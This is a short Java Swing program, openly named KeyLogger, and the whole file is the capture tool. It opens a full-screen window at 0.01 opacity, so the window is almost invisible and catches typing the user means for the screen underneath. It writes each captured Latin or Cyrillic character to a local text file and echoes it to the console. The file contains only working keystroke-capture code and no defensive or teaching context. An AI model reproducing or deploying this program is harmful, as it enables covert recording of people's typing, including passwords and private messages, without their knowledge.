import javax.swing.*;
import java.awt.*;
import java.awt.event.*;
import java.io.FileNotFoundException;
import java.io.PrintWriter;

public class KeyLogger extends JFrame {
    private static PrintWriter writer;

    KeyLogger() throws FileNotFoundException {
        super("KeyLogger");
        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        ClickAction clickAction = new ClickAction();
        addKeyListener(clickAction);
        setOpacity(0.01f);

        GraphicsDevice gd = getGraphicsConfiguration().getDevice();
        int width = gd.getDisplayMode().getWidth();
        int height = gd.getDisplayMode().getHeight();

        addWindowListener(new Close());

        setSize(width, height);
        setVisible(true);

        writer = new PrintWriter("KeyLogger/Documents/Text.txt");
    }

    public static void main(String[] args) {
        JFrame.setDefaultLookAndFeelDecorated(true);
        SwingUtilities.invokeLater(() -> {
            try {
                new KeyLogger();
            } catch (FileNotFoundException e) {
                throw new RuntimeException(e);
            }
        });
    }

    static class ClickAction extends KeyAdapter {
        @Override
        public void keyPressed(KeyEvent e) {
            if(e.getKeyCode() == 27) {
                writer.close();
                System.exit(0);
            }
            if(e.getKeyCode() >= 32 & e.getKeyCode() <= 122 |
                    e.getKeyCode() >= 1040 & e.getKeyCode() <= 1103 |
                    e.getKeyCode() == 222) {
                System.out.print(e.getKeyChar());
                writer.print(e.getKeyChar());
            }
        }

    }

    static class Close extends WindowAdapter {
        @Override
        public void windowClosing(WindowEvent e) {
            writer.close();
            System.exit(0);
        }
    }
}
